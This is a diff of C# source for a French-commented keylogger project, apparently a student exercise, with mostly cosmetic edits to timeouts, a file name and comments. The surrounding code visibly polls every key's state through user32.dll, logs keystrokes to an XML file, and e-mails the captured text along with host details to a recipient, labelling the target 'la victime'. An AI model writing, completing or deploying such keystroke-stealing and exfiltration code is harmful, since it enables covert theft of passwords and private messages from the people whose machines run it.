@@ -16,13 +16,20 @@ namespace ProjetKeyLogger
         private int sleep_time;
 
         //temps d'innactivité maximum avant l'envoi de mail
-        private int temps_inactivite_max;
+        int temps_inactivite_max;
 
-        //Chemin par défaut suivi du nom du fichier XML 
         private string file_path;
 
         //Initialisation du nombre de caractere tapé
         private int nb_caractere_tape;
+
+        public string File_Path
+        {
+            get
+            {
+                return file_path;
+            }
+        }
 
         //Constructeur
         public KeyLogger()
@@ -34,13 +41,13 @@ namespace ProjetKeyLogger
             sleep_time = 3;
 
             //on initialise le temps d'inactivité maximum (En minute)
-            temps_inactivite_max = 2;
+            temps_inactivite_max = 5;
 
             //On initialise la collection
             collection_enregistrement = new CollectionEnregistrement();
 
             //Chemin pour enregistrer le fichier XML
-            file_path = "Capture.xml";
+            file_path = "TestXML.xml";
 
         }
 
@@ -50,7 +57,6 @@ namespace ProjetKeyLogger
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(int cle);
 
-        
         public void capture()
         {
             //Création d'un objet Enregistrement qui contiendra le contenu de la capture clavier
@@ -73,12 +79,12 @@ namespace ProjetKeyLogger
                 //verification de l'état de chaque touche (up ou down)
                 for (int codeASCII = 0; codeASCII < 256; codeASCII++)
                 {
-                    
-
+                   
                     int statut_cle = GetAsyncKeyState(codeASCII);
                     //le statut d'un clé est a 0 si elle n'est pas active et est a 32769 si la touche est appuyée
                     if (statut_cle == 32769)
                     {
+
                         //le temps d'innactivité est reinitialisé
                         date_dernier_activite = DateTime.Now;
 
@@ -339,11 +345,9 @@ namespace ProjetKeyLogger
                                     {
                                         enregistrement.ajouterContenu(Char.ToLower((char)codeASCII).ToString());
                                     }
-                                }
-                               
-                                break;
+                                }break;
                         }
-
+                        //On incrémente le nombre de caracteres tapé
                         nb_caractere_tape += 1;
                     }
 
@@ -373,9 +377,7 @@ namespace ProjetKeyLogger
                         //envoie du mail
                         envoieMail();
                     }
-                    
-                }
-                                
+                  }           
             }
         }
 
@@ -394,7 +396,6 @@ namespace ProjetKeyLogger
             var nom_ordinateur = Dns.GetHostEntry(Dns.GetHostName());
 
             //Création du corps du mail
-            //Utiliser les autres fonctions de charlie 
             string corps_mail = "date : " + date_mail + "\n Adresse ip de la victime :" + nom_ordinateur + "\n";
             corps_mail += contenu_fichier;
 
@@ -436,7 +437,7 @@ namespace ProjetKeyLogger
             //Envoie du message
             client.Send(message_mail);
 
-            // Libère les ressources utilisé par le fichier envoyé par mail. Cela supprime le flux et permet au programme de continuer, sans cela le programme plante.
+            // Libère les ressources utilisées par le fichier envoyé par mail. Cela supprime le flux et permet au programme de continuer, sans cela le programme plante.
             message_mail.Dispose();
         }
     }
